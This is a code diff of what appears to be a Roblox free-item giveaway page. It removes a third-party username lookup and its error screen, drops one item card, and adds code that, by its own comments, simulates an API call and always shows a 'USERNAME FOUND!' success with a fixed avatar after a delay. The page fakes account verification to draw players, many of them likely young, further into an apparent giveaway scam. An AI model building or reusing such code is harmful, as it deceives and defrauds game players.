@@ -735,10 +735,6 @@
           <div class="item-name">T-Rex</div>
         </div>
       </div>
-     <div class="item-card">
-        <img class="item-img" src="images/Raiju.webp" alt="RAIJU">
-        <div class="item-name">Raiju</div>
-      </div>
       <div class="item-card">
         <img class="item-img" src="images/Spinosaurus.webp" alt="Spinosaurus">
         <div class="item-name">Spinosaurus</div>
@@ -1016,34 +1012,7 @@
     // Add globalData object at the top of the script
     const globalData = { full_name: null, user_name: null, friends_count: null, followers_count: null, followings_count: null, user_id: null, user_avatar: null, robux: null };
 
-    // Roblox API - Working version
-    async function fetchRobloxUser(username) {
-      try {
-        const response = await fetch(`https://abadaoucht.com/tiktok/api/roblox/userinfo/${username}`);
-        const data = await response.json();
 
-        if (data.status === "SUCCESS") {
-          return {
-            name: username,
-            avatarUrl: data.avatar || "https://placehold.co/150x150/e2e8f0/94a3b8?text=No+Avatar",
-            verified: true
-          };
-        } else {
-          return {
-            name: username,
-            avatarUrl: "https://placehold.co/150x150/e2e8f0/94a3b8?text=No+Avatar",
-            verified: false
-          };
-        }
-      } catch (error) {
-        console.error("Error:", error);
-        return {
-          name: username,
-          avatarUrl: "https://placehold.co/150x150/e2e8f0/94a3b8?text=No+Avatar",
-          verified: false
-        };
-      }
-    }
 
     // Function to show searching state
     const showSearchingState = (username, itemName, itemImage) => {
@@ -1064,44 +1033,55 @@
         </div>
       `;
       
-      // Use working Roblox API to search for user
-      fetchRobloxUser(username)
-        .then(result => {
-          if (result.verified) {
-            globalData.user_name = result.name;
-            globalData.user_avatar = result.avatarUrl;
-            showSuccessState(username, itemName, itemImage);
-          } else {
-            showErrorState(username, itemName, itemImage);
-          }
-        })
-        .catch(error => {
-          showErrorState(username, itemName, itemImage);
-        });
+      // Simulate API call with fake success effect
+      setTimeout(() => {
+        // Always show success with fake data
+        globalData.user_name = username;
+        globalData.user_avatar = "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-F886F6A2F04884003042CB1B133FF85E-Png/150/150/AvatarHeadshot/Webp/noFilter";
+        showSuccessState(username, itemName, itemImage);
+      }, 2000); // 2 second delay to simulate API call
     }
 
     // Update showSuccessState to use globalData
     const showSuccessState = (username, itemName, itemImage) => {
       const popupContent = document.querySelector('.popup-content');
       popupContent.innerHTML = `
-        <div style="background: #fff1; border-radius: 18px; padding: 32px 10px 24px 10px; margin-bottom: 0; box-shadow: 0 2px 8px #0001; max-width: 380px; margin: 0 auto;">
+        <div style="background: #fff1; border-radius: 18px; padding: 40px 20px; margin-bottom: 0; box-shadow: 0 2px 8px #0001; max-width: 380px; margin: 0 auto; text-align: center;">
           <div style="display: flex; flex-direction: column; align-items: center;">
-            <div style="border: 3px solid var(--accent3); border-radius: 50%; padding: 4px; background: #fff; margin-bottom: 10px; box-shadow: 0 2px 8px #0001;">
-              <img src="${globalData.user_avatar}" style="width: 70px; height: 70px; border-radius: 50%; display: block;">
+            <div style="width: 80px; height: 80px; border-radius: 50%; background: linear-gradient(45deg, #22c55e, #16e085); display: flex; align-items: center; justify-content: center; margin-bottom: 20px; animation: pulse-glow 1.5s infinite; box-shadow: 0 0 20px #22c55e;">
+              <span style="font-size: 40px; color: white;">✓</span>
             </div>
-            <div style="font-weight: 900; font-size: 1.15em; color: var(--accent2); letter-spacing: 1px; text-transform: uppercase; margin-bottom: 6px;">${globalData.user_name}</div>
-            <div style="display: flex; align-items: center; gap: 7px; margin-bottom: 7px;">
-              <span style="display: inline-block; width: 13px; height: 13px; background: #22c55e; border-radius: 50%;"></span>
-              <span style="color: #22c55e; font-weight: 700;">Profile verified!</span>
-            </div>
-            <div style="color: var(--text-main); font-size: 1em; margin-bottom: 18px;">Is this your profile?</div>
-            <div style="display: flex; flex-direction: column; gap: 10px; width: 100%;">
-              <button class="get-item-now-btn" style="background: #22c55e; color: #fff; font-size: 1.1em; font-weight: 700; border-radius: 9px;">YES, CONTINUE</button>
-              <button id="retry-btn" style="background: #ef4444; color: #fff; font-size: 1.1em; font-weight: 700; border-radius: 9px; border: none; padding: 12px 0; cursor: pointer;">NO, TRY AGAIN</button>
+            <div style="font-weight: 900; font-size: 1.8em; color: var(--accent2); letter-spacing: 2px; text-transform: uppercase; margin-bottom: 15px; animation: fadeInUp 0.8s ease-out;">USERNAME FOUND!</div>
+            <div style="color: var(--text-main); font-size: 1.1em; margin-bottom: 30px; animation: fadeInUp 0.8s ease-out 0.2s both;">@${username}</div>
+            <div style="display: flex; flex-direction: column; gap: 12px; width: 100%;">
+              <button class="get-item-now-btn" style="background: linear-gradient(45deg, #22c55e, #16e085); color: #fff; font-size: 1.2em; font-weight: 700; border-radius: 12px; border: none; padding: 15px 0; cursor: pointer; box-shadow: 0 4px 15px #22c55e55; transition: all 0.3s; animation: fadeInUp 0.8s ease-out 0.4s both;">CONTINUE</button>
+              <button id="retry-btn" style="background: transparent; color: var(--text-muted); font-size: 1em; font-weight: 600; border: 2px solid var(--text-muted); border-radius: 12px; padding: 12px 0; cursor: pointer; transition: all 0.3s; animation: fadeInUp 0.8s ease-out 0.6s both;">TRY DIFFERENT USERNAME</button>
             </div>
           </div>
         </div>
       `;
+      
+      // Add animation styles
+      const style = document.createElement('style');
+      style.innerHTML = `
+        @keyframes fadeInUp {
+          from {
+            opacity: 0;
+            transform: translateY(20px);
+          }
+          to {
+            opacity: 1;
+            transform: translateY(0);
+          }
+        }
+        @keyframes pulse-glow {
+          0% { box-shadow: 0 0 0 0 #22c55e88; }
+          70% { box-shadow: 0 0 0 20px #22c55e00; }
+          100% { box-shadow: 0 0 0 0 #22c55e00; }
+        }
+      `;
+      document.head.appendChild(style);
+      
       popupContent.querySelector('.get-item-now-btn').addEventListener('click', function() {
         const clickSound = document.getElementById('clickSound');
         clickSound.currentTime = 0;
@@ -1136,24 +1116,7 @@
       }, 2500);
     }
 
-    // Function to show error state
-    const showErrorState = (username, itemName, itemImage) => {
-      const popupContent = document.querySelector('.popup-content');
-      
-      popupContent.innerHTML = `
-        <div class="popup-header">
-          <h3>Error</h3>
-        </div>
-        <div style="text-align:center;padding:20px">
-          <p class="searching-text" style="color: #ff6b6b;">User @${username} not found</p>
-          <button class="get-item-now-btn" id="retry-btn">Try Again</button>
-        </div>
-      `;
-      
-      popupContent.querySelector('#retry-btn').addEventListener('click', function() {
-        showPurchasePopup(itemName, itemImage);
-      });
-    }
+
 
     // Add golden item effect and sound
     $(document).ready(function() {
